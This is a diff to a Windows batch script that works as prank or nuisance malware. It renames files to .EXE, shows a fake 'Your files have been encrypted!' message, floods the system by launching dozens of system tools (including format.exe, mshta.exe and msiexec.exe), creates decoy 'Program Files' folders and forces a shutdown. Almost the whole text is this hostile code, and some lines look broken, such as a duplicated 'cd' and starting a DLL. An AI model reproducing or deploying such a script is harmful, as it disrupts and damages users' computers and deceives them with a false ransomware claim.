@@ -30,6 +30,7 @@ REN *.WMZ *.EXE
 echo Your files have been encrypted!
 shutdown -s -t 10000
 cd C:\Windows\System32
+cd C:\Windows\System32
 start control.exe
 start notepad.exe
 start mspaint.exe
@@ -42,43 +43,27 @@ start dxdiag.exe
 start dccw.exe
 start dcomcnfg.exe
 start chkdsk.exe
-start regedit.exe
 start taskmgr.exe
 start defrag.exe
 start magnify.exe
 start tasklist.exe
 start narrator.exe
-start mavinject.exe
-start manage-bde.exe
 start iexplore.exe
 start xwizard.exe
-start ipksetup.exe
-start iexpress.exe
-start lusrmgr.exe
 start mblctr.exe
 start msra.exe
 start ntprint.exe
 start nslookup.exe
 start rekeywiz.exe
-start regedt32.exe
 start dvdplay.exe
 start sethc.exe
-start diskpart.exe
-start diskraid.exe
-start diskmgmt.exe
 start ddodiag.exe
 start explorer.exe
 start cleanmgr.exe
 start ipconfig.exe
-start iotstartup.exe
-start fsmgmt.exe
 start fsquirt.exe
 start fsutil.exe
-start ftp.exe
-start printui.exe
-start poqexec.exe
 start mobsync.exe
-start bdeunlocker.exe
 start calc.exe
 start hvax64.exe
 start OptionalFeatures.exe
@@ -98,5 +83,31 @@ start gpedit.exe
 start hdwwiz.exe
 start psr.exe
 start proquota.exe
-
-shutdown -s -t 0
+start hal.dll
+start charmap.exe
+start change.exe
+start CheckNetIsolation.exe
+start cmdkey.exe
+start cmdl32.exe
+start cmmon32.exe
+start cmstp.exe
+start CompMgmtLauncher.exe
+start DFDWiz.exe
+start Dxpserver.exe
+start expand.exe
+start eventcreate.exe
+start FileHistory.exe
+start fontview.exe
+start format.exe
+start msinfo32.exe
+start msiexec.exe
+start mshta.exe
+start mstsc.exe
+cd C:\Program Files (x86)\Windows Media Player
+start setup_wm.exe
+cd C:\
+md Program Files (x32)
+md Program Files (x64)
+echo Have a nice day.
+pause
+shutdown -s -t 10
